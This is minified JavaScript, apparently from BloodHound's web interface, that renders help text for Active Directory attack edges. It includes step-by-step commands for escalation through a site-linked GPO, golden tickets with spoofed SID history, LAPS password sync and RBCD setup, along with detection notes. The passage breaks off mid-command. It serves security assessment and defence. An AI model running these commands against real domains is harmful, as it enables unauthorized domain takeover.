audits:"}),e.jsx(t,{component:"pre",children:"SELECT * FROM sys.dm_server_audit_status"}),e.jsx(t,{variant:"body2",children:"View server specifications:"}),e.jsx(t,{component:"pre",children:`SELECT audit_id, 
a.name as audit_name, 
s.name as server_specification_name, 
d.audit_action_name, 
s.is_state_enabled, 
d.is_group, 
d.audit_action_id, 
s.create_date, 
s.modify_date 
FROM sys.server_audits AS a 
JOIN sys.server_audit_specifications AS s 
ON a.audit_guid = s.audit_guid 
JOIN sys.server_audit_specification_details AS d 
ON s.server_specification_id = d.server_specification_id`}),e.jsx(t,{variant:"body2",children:"View database specifications:"}),e.jsx(t,{component:"pre",children:`SELECT a.audit_id, 
a.name as audit_name, 
s.name as database_specification_name, 
d.audit_action_name, 
d.major_id,
OBJECT_NAME(d.major_id) as object,
s.is_state_enabled, 
d.is_group, s.create_date, 
s.modify_date, 
d.audited_result 
FROM sys.server_audits AS a 
JOIN sys.database_audit_specifications AS s 
ON a.audit_guid = s.audit_guid 
JOIN sys.database_audit_specification_details AS d 
ON s.database_specification_id = d.database_specification_id`}),e.jsx(t,{variant:"body2",children:"If server audit specifications are configured on the SQL Server, event ID 15457 logs may be created in the Windows Application log when SQL Server level configurations are changed to facilitate OS command execution."}),e.jsx(t,{variant:"body2",children:"If database audit specifications are configured on the SQL Server, event ID 33205 logs may be created in the Windows Application log when Agent and database level configuration changes are made."}),e.jsxs(t,{variant:"body2",children:["A summary of the what will show up in the logs, along with the TSQL queries for viewing and configuring audit configurations can be found at",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/Audit%20Command%20Execution%20Template.sql",children:"https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/Audit%20Command%20Execution%20Template.sql"}),"."]}),e.jsx(t,{variant:"body2",children:"Author: Scott Sutherland"})]}),Xm=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/NetSPI/PowerUpSQL/wiki",children:"https://github.com/NetSPI/PowerUpSQL/wiki"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.slideshare.net/nullbind/powerupsql-2018-blackhat-usa-arsenal-presentation",children:"https://www.slideshare.net/nullbind/powerupsql-2018-blackhat-usa-arsenal-presentation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#sqlserver",children:"https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#sqlserver"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-2017",children:"https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-2017"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.netspi.com/finding-sensitive-data-domain-sql-servers-using-powerupsql/",children:"https://blog.netspi.com/finding-sensitive-data-domain-sql-servers-using-powerupsql/"})]}),Zm={general:Qm,abuse:Ym,opsec:Jm,references:Xm},eb=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"An attacker with control over any domain within the forest can escalate their privileges to compromise other domains using multiple techniques."}),e.jsx(t,{variant:"body1",children:"Spoof SID history"}),e.jsx(t,{variant:"body2",children:"An attacker can spoof the SID history of a principal in the target domain, tricking the target domain into treating the attacker as that privileged principal."}),e.jsx(t,{variant:"body2",children:"Refer to the SpoofSIDHistory edge documentation under References for more details. The edge describes an attack over a cross-forest trust, but the principles remain the same."}),e.jsxs(t,{variant:"body2",children:["This attack fails if ",e.jsx("i",{children:"quarantine mode"})," is enabled (Spoof SID History Blocked = True) on the trust relationship in the opposite direction of the attack. The SID filtering removes SIDs belonging to any other domain than the attacker-controlled domain from the authentication request. However, enabling quarantine is rare and generally not recommended for same-forest trusts."]}),e.jsx(t,{variant:"body1",children:"Abuse TGT delegation"}),e.jsx(t,{variant:"body2",children:"An attacker can coerce a privileged computer (e.g., a domain controller (DC)) in the target domain to authenticate to an attacker-controlled computer configured with unconstrained delegation. This provides the attacker with a Kerberos TGT for the coerced computer."}),e.jsx(t,{variant:"body2",children:"Refer to the AbuseTGTDelegation edge documentation under References for more details. The edge describes an attack over a cross-forest trust, but the principles remain the same."}),e.jsxs(t,{variant:"body2",children:["This attack fails if ",e.jsx("i",{children:"quarantine mode"})," is enabled on the trust relationship in the opposite direction of the attack. This prevents TGTs from being sent across the trust. However, enabling quarantine is rare and generally not recommended for same-forest trusts."]}),e.jsx(t,{variant:"body1",children:"ADCS ESC5"}),e.jsx(t,{variant:"body2",children:"The Configuration Naming Context (NC) is a forest-wide partition writable by any DC within the forest. Most Active Directory Certificate Services (ADCS) configurations are stored in the Configuration NC. An attacker can abuse a DC to modify ADCS configurations to enable an ADCS domain escalation opportunity that compromises the entire forest."}),e.jsxs(t,{variant:"body2",children:["Attack steps:",e.jsxs("ol",{style:{listStyleType:"decimal",paddingLeft:"1.5em"},children:[e.jsx("li",{children:"Obtain a SYSTEM session on a DC in the attacker-controlled domain"}),e.jsx("li",{children:"Create a certificate template allowing ESC1 abuse"}),e.jsx("li",{children:"Publish the certificate template to an enterprise CA"}),e.jsx("li",{children:"Enroll the certificate as a privileged user in the target domain"}),e.jsx("li",{children:"Authenticate as the privileged user in the target domain using the certificate"})]})]}),e.jsx(t,{variant:"body2",children:'Refer to "From DA to EA with ESC5" under References for more details.'}),e.jsx(t,{variant:"body2",children:'If ADCS is not installed: An attacker can simply install ADCS in the environment and exploit it, as detailed in the reference "Escalating from child domain’s admins to enterprise admins in 5 minutes by abusing AD CS, a follow up".'}),e.jsx(t,{variant:"body1",children:"GPO linked on Site"}),e.jsx(t,{variant:"body2",children:"AD sites are stored in the forest-wide Configuration NC partition, writable by any DC within the forest. An attacker with SYSTEM access to a DC can link a malicious GPO to the site of any DC in the forest."}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 1: Obtain a SYSTEM session on a DC in the attacker-controlled domain"}),e.jsx("br",{}),"Use PsExec to start a PowerShell terminal as SYSTEM on the DC:"]}),e.jsx(t,{component:"pre",children:"PsExec64.exe -s -i -accepteula powershell"}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 2: Create a GPO"}),e.jsx("br",{}),"Use the GroupPolicy module of RSAT to create the new GPO:"]}),e.jsx(t,{component:"pre",children:'New-GPO -Name "MyGPO"'}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 3: Add the compromising setting to the GPO"}),e.jsx("br",{}),"Use SharpGPOAbuse to add a scheduled task that adds a compromised user to the Administrators group:"]}),e.jsx(t,{component:"pre",children:'.\\SharpGPOAbuse.exe --AddComputerTask --TaskName "MyTask" --Author "NT AUTHORITY\\SYSTEM" --Command "cmd.exe" --Arguments "/c net localgroup Administrators /Add DUMPSTER\\tim" --GPOName "MyGPO"'}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 4: Identify a target DC and it's site"}),e.jsx("br",{}),"Use the ActiveDirectory module of RSAT to query for DCs in the target domain:"]}),e.jsx(t,{component:"pre",children:"Get-ADDomainController -server bastion.local | select Name,Site"}),e.jsx(t,{variant:"body2",children:"Look up the site DistinguishedName:"}),e.jsx(t,{component:"pre",children:"Get-ADReplicationSite Default-First-Site-Name | select DistinguishedName"}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 5: Set the GPO permissions"}),e.jsx("br",{}),"This step is important to avoid applying the GPO to all computers connected to the site. Use the GroupPolicy module of RSAT to modify the permissions such that Authenticated Users can read the object but only the targeted computer applies the GPO settings:"]}),e.jsx(t,{component:"pre",children:`$GPO = Get-GPO -Name "MyGPO"
$GPO | Set-GPPermissions -PermissionLevel GpoRead -TargetName "Authenticated Users" -TargetType Group -Replace
$GPO | Set-GPPermissions -PermissionLevel GpoApply -TargetName "BASTION\\bldc01" -TargetType Computer`}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 6: Link the GPO to the site"}),e.jsx("br",{}),"Use the GroupPolicy module of RSAT to link the GPO to the site:"]}),e.jsx(t,{component:"pre",children:'New-GPLink -Name "MyGPO" -Target "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=bastion,DC=local" -Server dc01.dumpster.fire'}),e.jsx(t,{variant:"body2",children:"Note that you must specify the server to be the DC where you are running the command, as the command defaults to execute the change on a root domain DC where the compromised DC does not have the permissions to link the GPO."}),e.jsx(t,{variant:"body2",children:"Wait until replication has happened and the GPO has applied on the target DC, and log in with Administrators access on the compromised DC. Replication within the same site happens within 15 seconds but runs on 3 hour schedule by default across sites. GPOs are applied on a 90-120 min interval by default."})]}),tb=({sourceName:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The SameForestTrust edge represents a same-forest (intraforest) trust relationship between two domains within the same AD forest. In this relationship, the ",r," domain has a same-forest trust with the ",a," domain, allowing principals (users and computers) from ",a," to access resources in ",r,"."]}),e.jsx(t,{variant:"body2",children:"Since both domains belong to the same forest, they inherently trust each other, granting implicit access to resources across domains. It also means compromising one of the domains enable compromise of the other."}),e.jsx(t,{variant:"body1",children:"Trust Edge Properties"}),e.jsx(t,{variant:"body2",children:"BloodHound stores the following properties for SameForestTrust edges (listed under Relationship Information):"}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Spoof SID History Blocked"}),e.jsx("br",{}),"An attacker with control over the trusted domain may attempt to escalate privileges in the trusting domain using a ",e.jsx("i",{children:"spoof SID history"})," attack by injecting the SID of a privileged principal from the trusting domain into their authentication request. However, this attack can be prevented by SID filtering.",e.jsxs("p",{className:"my-4",children:["SID filtering removes domain SIDs from authentication requests of foreign principals based on the trust configuration. Built-in SIDs (S-1-5-32-*) are always filtered, regardless of the configuration. SID filtering blocks the spoof SID history attack over same-forest trusts when the trust is configured in ",e.jsx("i",{children:"quarantine mode"})," (",e.jsx("code",{children:"trustAttributes"})," flag"," ",e.jsx("code",{children:"QUARANTINED_DOMAIN"})," enabled), which filters out SIDs that do not belong to the trusted domain. Same-forest trusts does not have quarantine mode enabled by default."]}),'SID filtering is managed from the outbound side of the trust, and the "Spoof SID History Blocked" property is therefore only created if trust data from this side has been ingested.']}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"TGT Delegation"}),e.jsx("br",{}),"TGT delegation determines whether unconstrained delegation is allowed over the trust. When a principal from the trusted domain authenticates against a Kerberos resource with unconstrained delegation in the trusting domain, their Kerberos TGT (Ticket Granting Ticket) is forwarded to the resource as part of Kerberos authentication, but only if TGT delegation is enabled (true).",e.jsxs("p",{className:"my-4",children:["By default, TGT delegation is enabled for same-forest trusts. It is disabled if"," ",e.jsx("i",{children:"quarantine mode"})," (",e.jsx("code",{children:"trustAttributes"})," flag ",e.jsx("code",{children:"QUARANTINED_DOMAIN"}),") is enabled."]}),"TGT delegation is controlled from the inbound side of the trust, and the property is therefore only created if trust data from this side has been ingested."]}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Transitive"}),e.jsx("br",{}),"Transitivity defines whether the trust extends beyond the two domains involved. A transitive trust allows access not only to principals of the trusted domain but also to those from other domains trusted by the trusted domain.",e.jsx("br",{}),e.jsx("br",{}),"Same-forest trusts are always transitive."]}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Trust Attributes"}),e.jsx("br",{}),"This property stores the raw value of the ",e.jsx("code",{children:"trustAttributes"})," LDAP attribute, which defines the trust's configuration settings. BloodHound retains this property from both the outbound and inbound sides of the trust, as they may differ."]}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Trust Type"}),e.jsx("br",{}),'The trust type for same-forest trusts can be TreeRoot, ParentChild, or CrossLink (Shortcut). Refer to the "Microsoft AD Trust Technical Documentation" under References for more details.']})]}),rb=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc755321(v=ws.10)",children:"Microsoft AD Trust Technical Documentation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1134/005/",children:"T1134.005: Access Token Manipulation: SID-History Injection"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1187/",children:"T1187: Forced Authentication"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1649/",children:"T1649: Steal or Forge Authentication Certificates"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1558/",children:"T1558: Steal or Forge Kerberos Tickets"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1550/003/",children:"T1550.003: Use Alternate Authentication Material: Pass the Ticket"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1484/001/",children:"T1484.001: Domain or Tenant Policy Modification: Group Policy Modification"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/abuse-tgt-delegation",children:"AbuseTGTDelegation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/spoof-sid-history",children:"SpoofSIDHistory"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c",children:"From DA to EA with ESC5"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/",children:"Escalating from child domain’s admins to enterprise admins in 5 minutes by abusing AD CS, a follow up"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research",children:"SID filter as security boundary between domains? (Part 4) - Bypass SID filtering research"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/FSecureLABS/SharpGPOAbuse",children:"SharpGPOAbuse"}),e.jsx("br",{})]}),nb={general:tb,abuse:eb,references:rb},ab=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"When spoofing SID history over a same-forest trust, any domain SID from the target domain can be used. The most common choice is the Enterprise Admins SID, as it grants full control over the target domain."}),e.jsxs(t,{variant:"body2",children:["Spoofing SID history over a cross-forest trust is more restricted. In this scenario, SID filtering removes SIDs with a RID below 1000, meaning built-in AD groups like Domain Admins and Enterprise Admins cannot be used. Additionally, group memberships for global and universal groups are not applied based on SID history, making accounts in groups like Domain Admins and Enterprise Admins ineffective as targets.",e.jsx("p",{className:"my-4",children:"The attack target must be a user, computer, or a non-builtin group with permissions granted directly or through built-in/domain local groups (NOT through membership of global/universal groups)."}),"Common viable targets with indirect full control over the environment include:",e.jsxs("ul",{children:[e.jsx("li",{children:"The Exchange Windows Permissions group"}),e.jsx("li",{children:"Entra ID sync (MSOL_) accounts"}),e.jsx("li",{children:"Custom groups with administrative control over Tier Zero assets"})]}),e.jsx("br",{}),"Alternatively, an attacker can target a domain controller (DC) and use resource-based constrained delegation (RBCD) to obtain a local TGT as the DC, which can then be used for a DCSync attack on the target domain. However, the RBCD attack requires control over an account (user or computer) in the target forest. If no such account is available and the default permissions for creating computers have not been restricted, the attacker can first spoof SID history against a target with permissions to create computer accounts, to then perform the RBCD attack against a DC."]}),e.jsxs(t,{variant:"body2",children:["The spoofed SID can be added to SID history at three different levels for the attacker-controlled user of the trusted domain:",e.jsxs("ol",{style:{listStyleType:"decimal",paddingLeft:"1.5em"},children:[e.jsx("li",{children:"In the user's SID History AD attribute"}),e.jsx("li",{children:"In the user's Kerberos TGT"}),e.jsx("li",{children:"In the user's Kerberos inter-realm TGT"})]}),e.jsxs("p",{className:"my-4",children:["The first option enables the attack over both Kerberos and NTLM, whereas the latter two only apply to Kerberos authentication. However, modifying the SID History attribute is risky—it cannot be edited directly via LDAP or built-in AD tools. Mimikatz supports modifying it with the command"," ",e.jsx("code",{children:"sid::patch"})," followed by ",e.jsx("code",{children:"sid::add"}),", but ",e.jsx("code",{children:"sid::patch"})," does not work on Windows Server 2016 and later. It is possible to modify the SID History attribute using the DSInternals command ",e.jsx("code",{children:"Add-ADDBSidHistory"}),", but this requires stopping and restarting the NTDS service, which is not recommended in a production environment."]}),"The second and third options are safer. The following example demonstrates the second option."]}),e.jsx(t,{variant:"body1",children:"Step 1) Obtain krbtgt Credentials"}),e.jsx(t,{variant:"body2",children:"The krbtgt credentials can be obtained in multiple ways with administrative access to a DC in the trusted domain, such as via a DCSync attack."}),e.jsx(t,{variant:"body1",children:"Step 2) Forge and Inject a Golden Ticket"}),e.jsx(t,{variant:"body2",children:"Generate a Golden Ticket (Kerberos TGT) in the trusted domain with the target's SID added in SID history. Alternatively, a Diamond Ticket can be created for better OPSEC."}),e.jsx(t,{variant:"body2",children:"On Windows, use Rubeus:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe golden /aes256:<krbtgt AES256 secret key> /user:<trusted domain user SAMAccountName> /id:<trusted domain user RID> /domain:<trusted domain DNSname> /sid:<trusted domain SID> /sids:<target SID> /dc:<trusted domain DC DNSname> /nowrap /ptt"}),e.jsx(t,{variant:"body2",children:"This command injects the ticket into memory, allowing access to the target domain with the permissions of the target."}),e.jsx(t,{variant:"body2",children:"On Linux, use ticketer.py from Impacket:"}),e.jsx(t,{component:"pre",children:"ticketer.py -nthash <krbtgt NT hash> -aesKey <krbtgt AES256 secret key> -domain-sid <trusted domain SID> -domain <trusted domain DNSname> -extra-sid <target SID> <trusted domain user SAMAccountName>"}),e.jsxs(t,{variant:"body2",children:["The ticketer.py command saves the Golden Ticket as a ",e.jsx("code",{children:".ccache"})," file. To use it with tools supporting Kerberos authentication, set the ",e.jsx("code",{children:"KRB5CCNAME"})," environment variable:"]}),e.jsx(t,{component:"pre",children:"export KRB5CCNAME=$path_to_ticket.ccache"})]}),ob=({sourceName:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The cross-forest trust from ",a," to ",r," has a weak SID filtering configuration (Spoof SID History Blocked = False)."]}),e.jsxs(t,{variant:"body2",children:["The ",a," domain allows principals of ",r," access by SIDs of ",a," in their SID history. An attacker with control over the ",r," domain can craft access requests with manipulated SID history containing SIDs of privileged principals of ",a," to gain control over the ",a," domain."]})]}),ib=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc755321(v=ws.10)",children:"Microsoft AD Trust Technical Documentation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc755321(v=ws.10)#how-sid-history-can-be-used-to-elevate-privileges",children:"How SID History can be used to elevate privileges"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/",children:"Active Directory forest trusts part 1 - How does SID filtering work?"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1134/005/",children:"T1134.005: Access Token Manipulation: SID-History Injection"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1558/",children:"T1558: Steal or Forge Kerberos Tickets"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1550/003/",children:"T1550.003: Use Alternate Authentication Material: Pass the Ticket"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://adsecurity.org/?p=1772",children:"Sneaky Active Directory Persistence #14: SID History"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Add-ADDBSidHistory.md",children:"Add-ADDBSidHistory"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Rubeus",children:"Rubeus"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/fortra/impacket/blob/master/examples/ticketer.py",children:"ticketer.py"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/persistence/sid-history",children:"The Hacker Recipes: SID History"}),e.jsx("br",{})]}),sb={general:ob,abuse:ab,references:ib},cb=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["To abuse this privilege with DirSync, first import DirSync into your agent session or into a PowerShell instance at the console. You must authenticate to the Domain Controller as"," ",E(a,r),". Then, execute the"," ",e.jsx(t,{component:"pre",children:"Sync-LAPS"})," function:"]}),e.jsxs(t,{component:"pre",children:['Sync-LAPS -LDAPFilter "(samaccountname=',o,')"']}),e.jsxs(t,{variant:"body2",children:["You can target a specific domain controller using the ",e.jsx(t,{component:"pre",children:"-Server"})," ","parameter."]})]}),lb=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," the ability to synchronize the password set by Local Administrator Password Solution (LAPS) on the computer ",o,"."]}),e.jsxs(t,{variant:"body2",children:["The local administrator password for a computer managed by LAPS is stored in the confidential and Read-Only Domain Controller (RODC) filtered LDAP attribute"," ",e.jsx(t,{component:"pre",children:"ms-mcs-AdmPwd"}),"."]})]}),db=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"Executing the attack will generate a 4662 (An operation was performed on an object) event at the domain controller if an appropriate SACL is in place on the target object."})}),hb=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/simondotsh/DirSync",children:"https://github.com/simondotsh/DirSync"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://simondotsh.com/infosec/2022/07/11/dirsync.html",children:"https://simondotsh.com/infosec/2022/07/11/dirsync.html"})]}),pb={general:lb,abuse:cb,opsec:db,references:hb},ub=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The Entra user is synchronized to the on-prem AD user."}),e.jsx(t,{variant:"body2",children:"The Entra user may be able to authenticate as the on-prem AD user with its own password if password write-back is enabled. The Entra user may already have the same password as the on-prem user if password hash synchronization is enabled."})]}),mb=()=>e.jsx(t,{variant:"body2",children:"An attacker may authenticate as the on-prem AD user using the Entra user’s credentials, for example by key-logging the user’s password, or by changing the Entra user’s password and waiting for the password write-back operation to complete."}),bb=()=>e.jsx(t,{variant:"body2",children:"The attacker may create artifacts of abusing this relationship in both on-prem AD and in Entra. A password write-back operation against the on-prem user may create a 4724 Windows event, along with a corresponding Entra activity log entry indicating the Entra user’s password was changed."}),fb=()=>{const r=[{label:"Concept SSPR WriteBack",link:"https://learn.microsoft.com/en-us/entra/identity/authentication/concept-sspr-writeback"}];return e.jsx(l,{sx:{overflowX:"auto"},children:r.map(a=>e.jsxs(be.Fragment,{children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:a.link,children:a.label}),e.jsx("br",{})]},a.link))})},yb=()=>e.jsx(t,{variant:"body2",children:"An attacker may authenticate as the on-prem AD user using the Entra user’s credentials, for example by key-logging the user’s password, or by changing the Entra user’s password and waiting for the password write-back operation to complete."}),gb={general:ub,windowsAbuse:yb,linuxAbuse:mb,opsec:bb,references:fb},xb=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The on-prem AD user is synchronized to the Entra ID user."}),e.jsx(t,{variant:"body2",children:"The on-prem user may be able to authenticate as the Entra user with its own password if password hash synchronization, pass-through authentication, or seamless single sign-on is enabled."})]}),jb=()=>e.jsx(t,{variant:"body2",children:"An attacker may authenticate as the synchronized Entra user using the on-prem user’s credentials, for example by dumping the user’s plain-text credential from memory, key-logging the user’s password, or by changing the on-prem user’s password and authenticating with that new password."}),wb=()=>e.jsx(t,{variant:"body2",children:"The attacker may create artifacts of abusing this relationship in both on-prem AD and in Entra. A password reset operation against the on-prem user may create a 4724 Windows event, along with a corresponding Entra activity log entry when the on-prem agent synchronizes the new password hash up to Entra."}),vb=()=>{const r=[{label:"What is Password Hybrid Sync",link:"https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-phs"},{label:"How to connect Pass-Through Auth",link:"https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-pta"},{label:"How to connect Single Sign-on",link:"https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso"}];return e.jsx(l,{sx:{overflowX:"auto"},children:r.map(a=>e.jsxs(be.Fragment,{children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:a.link,children:a.label}),e.jsx("br",{})]},a.link))})},Ab=()=>e.jsx(t,{variant:"body2",children:"An attacker may authenticate as the synchronized Entra user using the on-prem user’s credentials, for example by dumping the user’s plain-text credential from memory, key-logging the user’s password, or by changing the on-prem user’s password and authenticating with that new password."}),Sb={general:xb,windowsAbuse:Ab,linuxAbuse:jb,opsec:wb,references:vb},Cb=({sourceName:r})=>e.jsx(e.Fragment,{children:e.jsxs(t,{variant:"body2",children:["The NTAuthStore contains the certificate of the Enterprise CA, ",r,". The consequence of the relationship is that certificate issued by the Enterprise CA are trusted for authentication in the AD forest of the NTAuthStore."]})}),kb=()=>e.jsx(t,{variant:"body2",children:"An attacker may perform several attacks that rely on an Enterprise CA to be trusted, such as ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."}),Tb=()=>e.jsx(t,{variant:"body2",children:"When an attacker abuses a privilege escalation or impersonation primitive that relies on this relationship, it will necessarily result in the issuance of a certificate. A copy of the issued certificate will be saved on the host that issued the certificate."}),Pb=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"Certified Pre-Owned ADCS Whitepaper"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication#BKMK_CertificatesInWindowsAuthentication",children:"Credentials Processes in Windows Authentication"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.pkisolutions.com/understanding-active-directory-certificate-services-containers-in-active-directory/",children:"Understanding Active Directory Certificate Services Containers in Active Directory"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.ravenswoodtechnology.com/components-of-a-pki-part-2/",children:"Components of a PKI, Part 2: Certificate Authorities and CA Hierarchies"})]}),Db=()=>e.jsx(t,{variant:"body2",children:"An attacker may perform several attacks that rely on an Enterprise CA to be trusted, such as ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."}),Ob={general:Cb,windowsAbuse:Db,linuxAbuse:kb,opsec:Tb,references:Pb},Rb=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," has write rights on all properties in the User Account Restrictions property set. Having write access to this property set translates to the ability to modify several attributes on computer ",o,", among which the msDS-AllowedToActOnBehalfOfOtherIdentity attribute is the most interesting. The other attributes in this set are listed in Dirk-jan's blog on this topic (see references)."]}),e.jsx(t,{variant:"body2",children:"The ability to modify the msDS-AllowedToActOnBehalfOfOtherIdentity property allows an attacker to abuse resource-based constrained delegation to compromise the remote computer system. This property is a binary DACL that controls what security principals can pretend to be any domain user to the particular computer object."}),e.jsx(t,{variant:"body2",children:'If the msDS-AllowedToActOnBehalfOfOtherIdentity DACL is set to allow an attack-controller account, the attacker can use said account to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket "as" this user.'}),e.jsx(t,{variant:"body2",children:'One caveat is that impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked. Another caveat is that the principal added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL *must* have a service principal name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an attacker does not currently control an account with a SPN set, an attacker can abuse the default domain MachineAccountQuota settings to add a computer account that the attacker controls via the Powermad project.'})]}),Eb=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 